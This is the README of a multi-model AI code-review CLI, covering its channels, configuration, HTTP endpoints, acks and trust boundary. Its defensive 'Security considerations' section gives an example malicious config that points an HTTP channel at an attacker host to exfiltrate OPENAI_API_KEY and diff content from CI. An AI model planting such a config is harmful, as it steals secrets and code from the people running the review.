# @zigrivers/mmr — Multi-Model Second-Opinion Engine

A multi-model **second-opinion engine** with two peer commands sharing one core
(independent fan-out + reconciliation):

- **`mmr review`** — automated multi-model **code review** of a diff/PR, with
  reconciliation and **severity gating**. Dispatches to Claude CLI, Codex CLI,
  Grok CLI, and Antigravity CLI (`agy`); reconciles findings with consensus
  scoring; gates on configurable severity thresholds.
- **`mmr critique`** — multi-model **design/brainstorm critique** of an artifact
  (a design doc, a pasted "problem + proposed solution", or a plan). **Advisory**
  — no severity and no pass/fail gate, so a critique never blocks (only a usage
  error like a missing input file exits non-zero). Reports **convergence**
  (where independent models agreed), **divergence** (genuine splits + the
  deciding crux), and an editorial **synthesis** that never picks a winner.
  Supports repo grounding (`--context repo`), iterative rounds (`--session`),
  and persona lenses (`--lenses`).

Built-in channels:

- **Antigravity CLI** (`agy`) — Google's supported replacement for the deprecated
  Gemini reviewer. The Antigravity channel is enabled by default and runs
  hardened (neutral cwd, `--sandbox`, auto-approve). The channel key is `antigravity`; `agy` is accepted as an alias
  in `--channels`, `channels_disabled`, and `channels:` config keys.
- **OpenCode CLI** (`opencode run`) — an open-source AI coding CLI. **Disabled by
  default** (opt-in): enable it in `.mmr.yaml` (`channels: { opencode: { enabled: true } }`)
  or pass `--channels=opencode`. The channel key is `opencode`; `opc` is accepted as an
  alias. Runs hardened: because opencode has no OS sandbox flag, every tool is denied
  via `OPENCODE_PERMISSION` so the review is text-in/text-out with no execution surface
  (a prompt-injected diff can't read files, dump env, or run commands), plus a neutral
  cwd and `--pure` (no external plugins). Reads the prompt from stdin; credentials stay
  under your real `$HOME` (`~/.local/share/opencode/auth.json`). Recover auth with
  `opencode auth login`.

## Install

```bash
npm install -g @zigrivers/mmr
```

## Quick Start

```bash
# One-command review (recommended for agents and CI)
mmr review --pr 47 --sync

# Or step-by-step
mmr review --pr 47          # Dispatch to all channels
mmr status mmr-a1b2c3       # Check progress
mmr results mmr-a1b2c3      # Reconcile and output findings

# Inject external review findings
mmr reconcile <job-id> --channel superpowers --input findings.json
```

## Commands

| Command | Purpose |
|---------|---------|
| `mmr review` | Dispatch review to configured channels |
| `mmr review --sync` | Full pipeline: dispatch, parse, reconcile, output verdict |
| `mmr review --dry-run` | Resolve diff, validate install/auth, and print prompts without dispatching |
| `mmr status <job-id>` | Check job progress |
| `mmr results <job-id>` | Collect and reconcile findings |
| `mmr config init` | Auto-detect CLIs and generate `.mmr.yaml` |
| `mmr config test` | Verify channel installation and auth |
| `mmr jobs list` | List recent review jobs |
| `mmr jobs prune` | Remove old jobs |
| `mmr reconcile <job-id>` | Inject external findings and re-reconcile |
| `mmr skill install` | Install a platform-specific MMR review skill into a project |

## Verdict System

| Verdict | Meaning | Exit Code |
|---------|---------|-----------|
| `pass` | All channels completed, no findings above threshold | 0 |
| `degraded-pass` | Some channels unavailable, compensating passes ran, gate passed | 0 |
| `blocked` | Findings at or above severity threshold | 2 |
| `needs-user-decision` | No channels completed | 3 |

## Configuration

Run `mmr config init` to generate `.mmr.yaml`, or create manually:

```yaml
version: 1
defaults:
  fix_threshold: P2
  timeout: 300
channels:
  claude:
    enabled: true
  codex:
    enabled: true
  antigravity:        # alias: agy
    enabled: true
```

> Note: the `gemini` channel was **retired** (its CLI is sunset; use `antigravity`).
> Existing configs that still name `gemini` keep loading — it is never dispatched.

## Installable skills

`mmr skill install` drops a "use MMR for code review" skill into a project, written
in the native convention of whichever agent CLI you run:

| Platform | Target | Format |
|----------|--------|--------|
| `cursor` | `.cursor/rules/mmr-review.mdc` | dedicated Cursor rule file |
| `codex` | `AGENTS.md` | idempotent managed block |
| `antigravity` | `AGENTS.md` | idempotent managed block |
| `opencode` | `.opencode/skills/mmr/SKILL.md` | full Agent Skill (auto-discovered) |

```bash
mmr skill install --platform cursor        # one platform
mmr skill install --all                     # every supported platform
mmr skill install --all --dry-run           # preview without writing
mmr skill install --platform cursor --force # overwrite an existing dedicated file
```

Codex and Antigravity both follow the [`AGENTS.md`](https://agents.md) standard, so
they share one managed block in `AGENTS.md`; installing either manages the same block.
Block-mode targets (`AGENTS.md`) are updated in place between
`<!-- BEGIN mmr-skill -->` / `<!-- END mmr-skill -->` delimiters, so re-running never
disturbs your own content. Dedicated-file targets (Cursor's `.mdc` and OpenCode's
`.opencode/skills/mmr/SKILL.md`) are created fresh and require `--force` to
overwrite an existing one. By default `mmr skill install` writes into the detected
project root (nearest `.git`); override with `--dir <path>`.

## Custom output parsers

Channels emit reviewer output in different shapes. `output_parser` accepts either a built-in parser name (string form — `default`, `gemini`, `doc-conformance`) or a structured object that builds a parser at dispatch time.

### `unwrap-jsonpath` — extract the model's response from an envelope

For OSS endpoints that wrap content in OpenAI-chat shape (`{choices: [{message: {content: "..."}}]}`):

```yaml
channels:
  qwen-local:
    command: scripts/ollama-openai-chat.sh  # posts stdin to Ollama's /v1/chat/completions endpoint
    flags: ["qwen2.5-coder:32b"]
    output_parser:
      kind: unwrap-jsonpath
      wrap: $.choices[0].message.content
      then: default          # default; pass the extracted string through the default parser
```

`wrap` is the schema key for the JSONPath selector inside the wrapper envelope. Supported jsonpath subset: `$` plus repeated property and numeric-index segments, such as `$.foo`, `$.foo.bar`, `$.foo[0]`, `$.foo[0].bar`, and `$.choices[0].message.content`.

### `regex-findings` — one finding per regex match

For tools that emit findings as flat lines (linter-style):

```yaml
channels:
  my-linter:
    command: my-linter
    flags: ["--format", "pipe"]
    output_parser:
      kind: regex-findings
      pattern: '^(P[0-3])\|([^|]+)\|([^|]+)(?:\|(.+))?$'
      fields:
        severity: 1
        location: 2
        description: 3
        suggestion: 4   # optional
```

`fields.location` and `fields.description` are required; `severity` and `suggestion` are optional. Missing or invalid severity defaults to `P2` during standard MMR finding validation.

### Ollama recipe (full example)

```yaml
channels:
  ollama-base:
    abstract: true            # v3.28 — template only, not dispatchable
    command: ollama
    auth:
      check: ollama list >/dev/null 2>&1
      failure_exit_codes: [1]
      recovery: Install Ollama and pull the model configured by this channel
    output_parser: default     # `ollama run` writes the model response directly

  qwen-coder:
    extends: ollama-base
    flags: ["run", "qwen2.5-coder:32b", "--format", "json"]

  deepseek-coder:
    extends: ollama-base
    flags: ["run", "deepseek-coder:33b", "--format", "json"]
```

## Configurable compensator

When one of the configured channels can't run (missing CLI, auth failure, timeout, or error), MMR dispatches a **compensating pass** to keep the review degraded-but-useful. By default that pass goes to `claude -p --output-format json`. Set `defaults.compensator` to redirect it to any channel you've already configured:

```yaml
defaults:
  compensator:
    channel: qwen-local        # name of an existing entry in channels:
    channel_focus_map:         # optional — override the focus preamble per-channel
      codex: |
        Focus on implementation correctness, memory safety, and async correctness.
        You are compensating for a missing Codex review.
      antigravity: |
        Focus on architectural consistency and dependency boundaries.
        You are compensating for a missing Antigravity review.

channels:
  qwen-local:
    extends: ollama-base       # see the Ollama recipe in Custom output parsers
    flags: ["run", "qwen2.5-coder:32b", "--format", "json"]
```

**Default behavior (when `defaults.compensator` is unset or omitted).** MMR dispatches `claude -p --output-format json` for each missing channel. This preserves the pre-v3.29 behavior so existing configs need no changes.

**Validation.** The loader rejects:
- `compensator.channel` referencing a name that does not exist in `channels:` (dangling reference).
- `compensator.channel` pointing at a channel marked `abstract: true` — abstract channels are templates (v3.28 T1-A) and cannot be dispatched. Reference a concrete channel that `extends:` it instead.

### Recipe — use a local model as the compensator

For a fully OSS-only setup (no Anthropic CLI required), configure a local Ollama channel and reference it as the compensator:

```yaml
version: 1
defaults:
  compensator:
    channel: qwen-coder

channels:
  ollama-base:
    abstract: true
    command: ollama
    auth:
      check: ollama list >/dev/null 2>&1
      failure_exit_codes: [1]
      recovery: Install Ollama and pull a model
    output_parser: default     # `ollama run` writes the model response directly

  qwen-coder:
    extends: ollama-base
    flags: ["run", "qwen2.5-coder:32b", "--format", "json"]
```

When enabled review channels such as `codex` or `antigravity` are unavailable, missing, or failing, MMR runs `qwen-coder` for each compensating pass instead of `claude -p`. Channels set to `enabled: false` are intentionally skipped and do not receive compensating passes.

## Features

- **--sync mode** — single-command entry point for agents and CI
- **--dry-run mode** — preview resolved channels and assembled prompts without spawning review subprocesses; install and auth checks still run so the preview shows which channels would dispatch
- **Compensating passes** — Claude-based review for unavailable channels
- **Consensus scoring** — multi-source findings get high confidence
- **Atomic job store** — per-channel status files, no write races
- **POSIX-portable** — `command -v` for install checks, works everywhere

## v3.28 — Config foundations

### Channel inheritance with `extends:` and abstract parents

Define an abstract template once, then inherit it per model. The parent's
fields are deep-merged into the child; the child may override any field.

```yaml
channels:
  ollama-base:
    abstract: true                          # template only, never dispatched
    command: ollama run
    output_parser: default
    auth:
      check: "ollama list"
      timeout: 5
      failure_exit_codes: [1]
      recovery: "ollama serve"

  qwen:
    extends: ollama-base
    flags: ["qwen2.5-coder:32b", "--format", "json"]

  deepseek:
    extends: ollama-base
    flags: ["deepseek-r1:14b", "--format", "json"]
```

- Cycle detection rejects configs where `A extends B extends A` (or longer loops).
- Maximum extends depth is 4 levels.
- Concrete channels (`abstract: false` — the default) must end up with a `command`
  after merge; an abstract parent supplies it implicitly.

### `mmr config init` — local-runtime probing

`mmr config init` probes for `ollama`, `lms` (LM Studio), `llama-server`
(llama.cpp), and `local-ai-delegate` with a 1-second per-probe timeout.
Detected runtimes emit a commented `# example: ...` channel block in the
generated `.mmr.yaml` (not enabled by default). Pass `--with-examples` to
emit the full OSS catalog whether or not the runtimes are detected.

```bash
mmr config init --with-examples
```

### `mmr config channels show <name>`

Print the fully merged configuration for one channel with per-field
provenance (`# from default | user | project`). Secrets in `env` and
`headers` are replaced with `<redacted>` by default. Pass `--no-redact`
to print them verbatim (a warning banner is printed to stderr).

```bash
mmr config channels show claude
```

The loader also warns when a channel `headers:` block contains a literal
`Authorization` (or similarly secret-shaped) value — these should be moved
into an env var and referenced via `api_key_env` (the env-var name itself
is non-secret, the value never appears in any introspection output).

### `mmr review --dry-run`

Resolve the diff, assemble the prompt, run auth checks, and print which
channels *would* dispatch and the prompt each would receive — without
spawning any review subprocesses. A clear banner makes it obvious the
output is not real findings.

```bash
mmr review --pr 42 --dry-run
```

## v3.30 — Sessions, acks, HTTP channels, and trust boundary

### Stable finding identity and sessions

Each reconciled finding now carries a `finding_key` — a deterministic hash
built from the **normalized** location and category plus a SHA-1 of the
normalized description and suggestion (severity is intentionally *not* part of
the key). The SHA-1 here is a **content-identity** digest for
deduplicating findings across rounds — not a security primitive — so
cryptographic collision resistance is not a requirement here (a chance
collision would merely merge two unrelated findings, which is both
astronomically unlikely and harmless).
Normalization strips trailing line/column spans from the location and
inline `line N` mentions from the prose, and folds casing/whitespace. As a
result, line-number drift and severity changes do not change the identity of an
issue across rounds. This line-independent, case-folded identity is
intentional: a single ack then covers the same issue as it recurs at shifted
lines (or across case-variant paths), and any incidental merge of two findings
is harmless because the key is only a dedup/identity handle. The hash still
depends on the description/suggestion text,
so a substantial channel-side rewrite *will* produce a new key — that larger
phrasing drift is absorbed by the fuzzy **ack** fallback described below
(Jaccard ≥ 0.7 on the description shingle), not by the key itself.

Sessions group related reviews. Choose a session id matching
`^[a-zA-Z0-9_-]+$` that is not a reserved name (`con`, `prn`, `aux`, `nul`,
`com1`–`com9`, `lpt1`–`lpt9`, `index`, `__proto__`), register it with
`mmr sessions start <id>`, then pass `--session <id>` and `--round N`
(one-based) to link a review to its predecessors:

    mmr sessions start my-feature
    # → session record printed (includes the id)
    mmr review --pr 123 --session my-feature --round 1 --sync
    # ...do fix work...
    mmr review --pr 123 --session my-feature --round 2 --sync

When `--session` is set without `--max-rounds`, the default cap is 5 rounds.
Round 6 exits early with `verdict: 'needs-user-decision'` and a `summary` of
`max_rounds_exceeded: …`.

Manage sessions with:

    mmr sessions list
    mmr sessions show <id>
    mmr sessions end <id>

### Acknowledging known findings

A finding that is intentional in your project (an "ack") can be silenced so
later reviews surface it as advisory rather than blocking. Acks are keyed by
`finding_key`, with a location-anchored Jaccard fuzzy fallback (≥ 0.7 on the
5-gram description shingle) that survives small LLM phrasing changes.

Workflow:

    # Find the finding_key for the issue you want to ack:
    mmr review --pr 123 --sync --format json | jq '.reconciled_findings[] | select(.location | startswith("src/legacy/")) | .finding_key'

    # Ack it with a reason:
    mmr ack add <finding_key> --reason "legacy module — scheduled rewrite in Q3"

    # List:
    mmr ack list

    # Remove:
    mmr ack rm <finding_key>

By default (`--scope project`, the default), acks are stored at
`./.mmr/acks/<finding_key>.json` (committed and shared with the team). Pass
`--scope user` to store under `~/.mmr/acks/` (private to your machine).

Acked findings remain visible in `reconciled_findings` with
`acknowledged: true` and `ack_match: 'exact' | 'fuzzy'`; they no longer
block the gate.

### HTTP channels

In addition to subprocess channels (which spawn a CLI like `claude -p`),
v3.30 supports `kind: http` channels that POST to OpenAI-compatible
`/v1/chat/completions` endpoints. This covers LM Studio, vLLM, llama-server,
Ollama (via its `/v1/chat/completions` shim), Groq, Together.ai, Anyscale,
and Fireworks without writing a shell wrapper.

Required fields for an HTTP channel:

- `kind: http`
- `endpoint` — the full chat-completions request URL, normally ending in
  `/v1/chat/completions`. Non-standard paths are allowed, but then you must
  also supply an explicit `auth.check_endpoint` (see below), since the
  auth-probe URL can only be derived from a `/chat/completions` suffix.
- `model` — the model string the endpoint expects
- `endpoint_convention: openai-chat` — the only convention supported in
  v3.30; `generic` is rejected and reserved for a future release.

Optional fields:

- `api_key_env` — the NAME of the env var holding the API key. The literal
  value is never written to `.mmr.yaml`.
- `api_key_header` (default `Authorization`)
- `api_key_prefix` — prepended to the key value in the auth header. The
  default is the word `Bearer` followed by a single trailing space (the
  seven-character string `Bearer `). Set it to an empty string (`""`) for
  providers that expect a raw key with no prefix.
- `headers` — extra headers (e.g. `{ "X-Org": "..." }`)
- `auth.check_endpoint` — explicit auth-probe URL, written as a `check_endpoint`
  key nested under an `auth:` block (the `auth.` prefix is dot-notation for that
  nesting):

  ```yaml
  channels:
    custom:
      kind: http
      endpoint: https://api.example.com/v2/respond   # non-standard path
      model: my-model
      endpoint_convention: openai-chat
      auth:
        check_endpoint: https://api.example.com/v2/health
  ```

  When unset, MMR derives the probe by replacing a trailing `/chat/completions`
  with `/models` (a single trailing slash on the endpoint is tolerated). If the
  endpoint does not end in `/chat/completions`, `auth.check_endpoint` is
  required (and config validation fails without it).

#### LM Studio (local, no API key)

```yaml
channels:
  lm-studio:
    kind: http
    endpoint: http://localhost:1234/v1/chat/completions
    model: qwen2.5-coder-32b-instruct
    endpoint_convention: openai-chat
```

#### Groq

```yaml
channels:
  groq:
    kind: http
    endpoint: https://api.groq.com/openai/v1/chat/completions
    model: llama-3.3-70b-versatile
    endpoint_convention: openai-chat
    api_key_env: GROQ_API_KEY
```

#### Together.ai

```yaml
channels:
  together:
    kind: http
    endpoint: https://api.together.xyz/v1/chat/completions
    model: meta-llama/Llama-3-70b-chat-hf
    endpoint_convention: openai-chat
    api_key_env: TOGETHER_API_KEY
```

Status mapping: `200` → completed, `401` → `auth_failed`, `429` or `5xx`
→ `failed`, fetch timeout → `timeout`. The API key value is sent on every
request, but is NEVER written to logs or persisted job state.

### Security considerations

When MMR resolves a trusted **base ref** for a review — `--pr` with a
successfully resolved upstream base, an explicit `--base`, an explicit
`--config-base-ref`, or the local non-CI default of `HEAD` — both `.mmr.yaml`
and `./.mmr/acks/` are loaded *exclusively from that ref* (via `git show`),
never from the working tree. In the other modes (`trust_mode` of
`untrusted-head` — e.g. `--staged`/`--diff`/unresolvable `--pr` under CI — or
`non-git`), project config and project acks are **not loaded at all** unless
you pass the corresponding trust flag below; user-scope config/acks always
load. This base-ref rule closes two attack surfaces:

1. **Ack self-suppression.** Without the rule, a PR could add a
   `./.mmr/acks/<key>.json` file in the same diff that introduces the
   findings being acked, silently shipping the issue.
2. **HTTP channel secret exfiltration (P0).** Without the rule, a PR
   could add a `kind: http` channel to `.mmr.yaml` with
   `endpoint: https://attacker.example/log` and
   `api_key_env: OPENAI_API_KEY`, exfiltrating CI secrets and diff
   content.

The four trust flags:

- `--accept-new-acks` — required when the diff under review adds or
  modifies files under `./.mmr/acks/`. Without it, MMR returns
  `verdict: 'needs-user-decision'` and lists the proposed acks.
- `--trust-project-config` — required when the diff under review adds
  or modifies `./.mmr.yaml`. Without it, MMR returns
  `verdict: 'needs-user-decision'` and reports
  `proposed_config_change: true`.
- `--config-base-ref <ref>` — for CI / wrapper flows that operate on
  an untrusted checked-out PR head. Tells MMR to load both
  `.mmr.yaml` and project acks from this trusted ref via
  `git show`. **Preferred over `--trust-project-*`** when a trusted
  ref exists.
- `--trust-project-acks` — broader equivalent to `--accept-new-acks`
  for untrusted-HEAD / non-Git modes. Honors working-tree project
  acks. Logged with a noisy banner.

Each review's output carries a `trust_mode` field with one of:
`'base-ref'`, `'untrusted-head'`, `'non-git'`. Inspect this field
to confirm which boundary applied to your run.

User-scope config (`~/.mmr/config.yaml`) and user-scope acks
(`~/.mmr/acks/`) are trusted unconditionally in every mode, because
they are local to the user running MMR.

The threat scenario the design closes:

> Alice opens a PR that adds `.mmr.yaml` with a `kind: http` channel
> pointed at her server, plus a benign-looking code change. Bob's CI
> runs `mmr review --pr` on that PR. Without the base-ref rule, Bob's
> CI would dispatch the new HTTP channel during the review, sending
> `OPENAI_API_KEY` and the full diff to Alice's server. With the rule,
> the channel is not loaded (it does not exist at the base ref) and
> the verdict is `needs-user-decision` until Bob explicitly opts in
> with `--trust-project-config`.

Scaffold's wrappers (`scaffold run review-pr`, `scaffold run review-code`)
pick the **input mode** for you (`--pr`, `--staged`, `--base/--head`,
`--diff`) but do **not** pass the trust flags. For a `--pr` review the
base-ref boundary applies automatically, so the trust flags are usually
unnecessary; if a review returns `needs-user-decision` (e.g. the diff touches
`.mmr.yaml` or `./.mmr/acks/`, or you are in an untrusted-head/non-git mode),
re-run with the appropriate trust flag above yourself.

Full documentation: [scaffold README](https://github.com/zigrivers/scaffold#mmr--multi-model-review-cli)

## Grok channel — closed-book override

By default the built-in grok channel keeps web search **on** (`--tools web_search,web_fetch`). To run grok closed-book (no web access), you must override `channels.grok.flags` in `.mmr.yaml`. Because MMR's config merge **replaces arrays** (not appends), a `flags` override must restate the **entire** hardened array and add `--disable-web-search`. Any file-path flag you add must be **absolute** — the channel runs in a neutral `cwd`, so relative paths silently break.

> ⚠️ **Upgrade note for existing grok customizers.** If your `.mmr.yaml` already sets `channels.grok.flags` (for a timeout tweak, a prior closed-book attempt, etc.), that array **replaces** the new hardened defaults — so your grok reviews will run **without** `--no-memory`, the web-only tool allowlist, `--no-subagents/--no-plan`, or `--disallowed-tools run_terminal_cmd`, losing the context-bleed protections. Dropping `--disallowed-tools run_terminal_cmd` will additionally make grok **fail outright on any grok release carrying the upstream `run_terminal_cmd` regression** (first observed in grok 0.2.99, where headless session creation aborts with "agent building failed"; it persists until xAI fixes the built-in tool's default). The flag is harmless on unaffected versions, so keep it regardless. Restate the full hardened array (below) in your override to keep them. (The isolated `HOME`/`cwd` posture lives in `env`/`cwd`, which deep-merge, so those survive a `flags`-only override — but the flags do not.)

```yaml
channels:
  grok:
    flags:
      - --prompt-file
      - '{{prompt_file}}'
      - --output-format
      - json
      - --no-memory
      - --tools
      - web_search,web_fetch
      - --disallowed-tools     # grok >= 0.2.99: remove the broken built-in bash
      - run_terminal_cmd       #   tool or headless session creation aborts
      - --no-subagents
      - --no-plan
      - --json-schema          # force structured final output (see cancellation
      - '{{findings_schema}}'  #   section below); review substitutes the schema
      - --disable-web-search   # closed-book: no web
```

### Grok mid-review cancellation under concurrent sessions

Under **same-account concurrent grok sessions** (parallel MMR jobs, agents, or
worktrees), grok frequently **cancels a review mid-run**: the
`--output-format json` envelope comes back with `stopReason: "Cancelled"` after
1–3 turns and only a short "I'll review…" ack in `$.text` — the computed answer
is lost (the envelope truncates `thought` to ~200 chars, so nothing is
salvageable). Verified on grok 0.2.103 (2026-07-18): the identical prompt
completes serially and cancels 5/8 times under 4-way concurrency. It is **not**
an auth problem (`mmr doctor` stays green) and **not** MMR's dispatch timeout
(which is 300s and would report `status: timeout`).

MMR defends in four layers:

1. **Structured output (primary).** The built-in grok flags pass
   `--json-schema` with MMR's findings schema (the `{{findings_schema}}`
   placeholder is substituted at review dispatch; `mmr critique` strips the
   pair — its reply shape differs). With the schema constraint the final answer
   reliably lands in `$.text` and cancellations drop sharply (5/8 → 1/8 in the
   4-way repro). Requires a grok CLI with `--json-schema`; on an older grok the
   channel fails with an unknown-argument error — update grok.
2. **Last-object parse.** With the schema active, grok emits one schema-shaped
   JSON object **per turn** (intermediate "Reviewing…" progress acks included).
   The grok parser is `then: 'default-last'`, taking the **last** top-level
   object — first-object extraction was observed to flip a 3-finding review
   into "approved, no issues found".
3. **One serial retry.** When a run still completes with
   `stopReason: "Cancelled"`, the dispatcher re-dispatches it **once**. The
   retry starts after the concurrency burst that killed the first attempt has
   largely passed, so it usually restores real grok coverage.
4. **Honest failure + compensating pass.** If the retry is cancelled too, the
   parser's **preemptive** `incomplete` guard fails the channel with
   *"channel run did not complete (stopReason=Cancelled) …"* — even when
   `$.text` holds a parseable intermediate ack (which must never masquerade as
   a clean review). The failed channel then triggers MMR's compensating pass
   (`compensating-grok`), so the review still gates on a full panel.

MMR does **not** salvage findings from grok's `thought` field on a cancelled run —
the envelope truncates it, and an interrupted review's partial reasoning could
wrongly approve a PR a completed review would have blocked.
